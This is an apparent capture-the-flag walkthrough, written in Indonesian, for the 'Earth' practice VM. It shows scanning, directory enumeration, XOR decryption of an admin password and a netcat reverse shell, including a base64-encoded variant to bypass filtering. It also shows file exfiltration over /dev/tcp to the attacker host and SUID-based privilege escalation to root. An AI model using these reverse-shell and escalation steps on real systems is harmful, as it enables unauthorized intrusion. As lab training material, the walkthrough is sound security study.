# Laporan Serangan Server Earth

Ini adalah hasil serangan yang telah dilakukan pada server Earth untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : `ip a` atau `ifconfig` 
- nmap: `nmap -sP <network_id>/<prefix>`
- uji koneksi, kali linux dan server earth: `ping <ip_server>`

## Scan Port Server dengan NMAP
- nmap : `nmap -sC -sV -v -T4 <ip_server>`

**Port** yang terbuka dari server adalah :
- ssh (22)
- http (80)
- https (443)

## Setting Hosts
- buka ip_server pada browser
- jika error (400), maka setting hosts
```
mousepad /etc/hosts
```
- paling bawah tambahkan ip_server dan DNS (sesuai dengan hasil scan nmap)
```
<ip_server> earth.local terratest.earth.local
```
- buka di browser
	- http : `http://earth.local`
	- https : `https://terratest.earth.local`

## Scan Link Yang Ada pada Web
gunakan gobuster untuk scan link
- gobuster http :
```
gobuster dir -u http://earth.local -w /usr/share/wordlists/dirb/common.txt
```
- access admin : `http://earth.local/admin`
- dan login
- access sub domain : `https://terratest.earth.local`
- gobuster https :
```
gobuster dir -u https://terratest.earth.local -k -w /usr/share/wordlists/dirb/common.txt
```
- access robot : `https://terratest.earth.local/robots.txt`
- access testing : `https://terratest.earth.local/testingnotes.*`
- karena terdapat * maka bisa dicoba-coba, contoh `.html`, `.php`, `.js`, `.txt`
- access testing kembali : `https://terratest.earth.local/testingnotes.txt`
- user : `terra`

## Temukan Informasi Dari Hasil Enkripsi Halaman Index HTTP
gunakan CyberChef : `https://gchq.github.io/CyberChef/`
- setting Recipe
	- atur `From Hex`, Delimiter : `Auto`
	- atur `XOR`, Key : `UTF8`
	- access : `https://terratest.earth.local/testdata.txt`
	- copy semua text, dan paste pada key xor

- informasi hasil enkripsi
	- copy enkripsi pada `Input`
	- dan tekan `Bake`
	- ulangi untuk semua enkripsi
	- temukan kalimat berulang 
	`earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humans`
	- password : `earthclimatechangebad4humans`
- login : `http://earth.local/admin`
- gunakan user dan password yang ditemukan

## Exploit Server
- jalankan perintah terminal
	- `whoami`
	- `ls /`
	- `ls /var/`
	- `ls /var/earth_web/`
	- flag : `cat /var/earth_web/user_flag.txt`
- setting netcat
	- form CLI server : `nc -e /bin/bash <ip_kali> 4444`
	- terminal client : `nc -lvnp 4444`
	- jika perintah netcat server error maka perlu di enkripsi terlebih dahulu
	- enkripsi : `echo 'nc -e /bin/bash <ip_kali> 4444' | base64`
	- output : `berupa string hasil generate enkripsi`
	- form CLI server : `echo '<string_generate>' | base64 -d | bash`

## Privilege Escalation
- mode terminal
	- python
	```
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	```
	```
	export TERM=xterm
	```
- privilege
	- cari reset root
	```
	find / -perm -u=s 2>/dev/null
	```
	- jalankan reset root
	```
	reset_root
	```
	- jika failed maka, menggunakan netcat
- tool ltrace
	- cek : `ltrace`
	- jika belum, maka install 
	```
	sudo apt install ltrace
	```
- netcat
	- terminal user : `nc -lvnp 2020 > reset_root`
	- terminal server : `cat /usr/bin/reset_root > /dev/tcp/<ip_kali>/2020`
	- pada terminal user
		- ubah mode : `chmod +x reset_root`
		- trace : `ltrace ./reset_root`
- buat file
	- dari hasil ltrace buat file pada terminal server
	- file 1 : `touch /dev/shm/<sesuai_ltrace>`
	- file 2 : `touch /dev/shm/<sesuai_ltrace>`
	- file 1 : `touch /tmp/<sesuai_ltrace>`
	- reset_root kembali : `reset_root`
- temukan flag
	- pindah user root : `su root`
	- password : `Earth`
	- `cd /root`
	- `cat root_flag.txt`